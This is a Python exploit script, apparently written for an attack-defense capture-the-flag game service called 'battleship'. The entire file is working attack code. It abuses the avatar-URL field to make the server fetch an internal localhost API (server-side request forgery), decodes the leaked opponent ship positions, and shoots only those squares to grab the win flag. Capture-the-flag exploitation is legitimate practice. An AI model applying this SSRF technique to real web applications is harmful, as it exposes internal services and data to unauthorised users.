#!/usr/bin/env python3
import sys
import json
import requests
import random
import string
import time
import base64
from battleship_lib import *

host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
hint_obj = sys.argv[2] if len(sys.argv) > 2 else 'player131'

print(host)
print(hint_obj)


URL = f'http://{host}:{PORT}'

bs = BattleshipLib(URL)

def gen_username():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(15))

def gen_password():
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(15))

def get_ship_coords(ship):
    coords = []
    start_x, start_y = ship['Start']['x'], ship['Start']['y']
    end_x, end_y = ship['End']['x'], ship['End']['y']
    
    if start_y == end_y:
        for x in range(start_x, end_x + 1):
            coords.append((x, start_y))
    else:
        for y in range(start_y, end_y + 1):
            coords.append((start_x, y))
    
    return coords

def main():
    s = requests.Session()
    
    username = gen_username()
    password = gen_password()
    flag = "test"
    
    bs.register(s, username, password, flag)
    bs.login(s, username, password)
    
    r = bs.create_game(s, hint_obj)
    
    r = bs.update_avatar(s, f"http://localhost:8080/api/game/get-game-info")
    
    user_info_resp = bs.get_user_info(s)
    ships_data = json.loads(base64.b64decode(user_info_resp.json()['avatar']))
    ships = ships_data['ships']
    
    win_flag = None
    
    for ship in ships:
        coords = get_ship_coords(ship)
        for x, y in coords:
            shot_response = bs.make_shot(s, x, y)
            
            try:
                result = shot_response.json()
                
                if result.get('hit') and result.get('message', '').startswith('win:'):
                    win_flag = result['message'].split('win: ')[1]
                    break
            except Exception as e:
                pass
        
        if win_flag:
            break
    
    if win_flag:
        print(win_flag, flush=True)
    else:
        print("Failed to capture the flag", flush=True)

if __name__ == '__main__':
    main()